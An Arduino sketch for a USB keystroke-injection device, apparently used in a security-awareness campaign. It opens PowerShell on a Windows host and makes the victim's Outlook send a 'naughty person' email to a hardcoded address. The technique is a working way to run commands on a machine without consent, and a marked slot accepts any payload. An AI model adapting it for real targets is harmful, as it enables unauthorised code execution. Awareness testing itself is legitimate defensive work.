#include <Arduino.h>
#include <Keyboard.h>

// IF SOMEONE RE-USE THIS CODE : think on replacing this before anything else ^^'
#define ALERT_MAIL "\"ulysse31@gmail.com\""

void setup() {
  // Keyboard library start
  Keyboard.begin();
  // Some delay is needed just to be sure that usb keyboard gets enabled on Host Operating system (may vary between target)
  delay(1200);
}

void loop()
{
  // Launch an execute command window
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(10);
  Keyboard.releaseAll();
  delay(100);
  // type & launch powershell.exe
  Keyboard.print("powershell.exe");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.release(KEY_RETURN);
  // waiting longer for powershell instanciation (depends on target speed)
  delay(200);
  //
  // Powershell payload HERE: sample payload, works great on Microsoft Enabled O365 / Exchange Companies
  Keyboard.print("$Outlook = New-Object -ComObject Outlook.Application");
  delay(10);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.release(KEY_RETURN);
  Keyboard.print("$Mail = $Outlook.CreateItem(0)");
  delay(10);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.release(KEY_RETURN);
  Keyboard.print("$Mail.To = ");
  Keyboard.print(ALERT_MAIL);
  delay(10);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.release(KEY_RETURN);
  Keyboard.print("$Mail.Subject = \"I'm a naughty person\"");
  delay(10);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.release(KEY_RETURN);
  Keyboard.print("$Mail.Body =\"Sorry, I'm naughty I plugged in a unknown usb key\"");
  delay(10);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.release(KEY_RETURN);
  Keyboard.print("$Mail.Send()");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.release(KEY_RETURN);
  // End Powershell payload
  //
  Keyboard.print("exit");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.release(KEY_RETURN);
  // We are in a awareness campaign, this is enough so we stop here and wait forever ^^ 
  delay(4000000000);
}
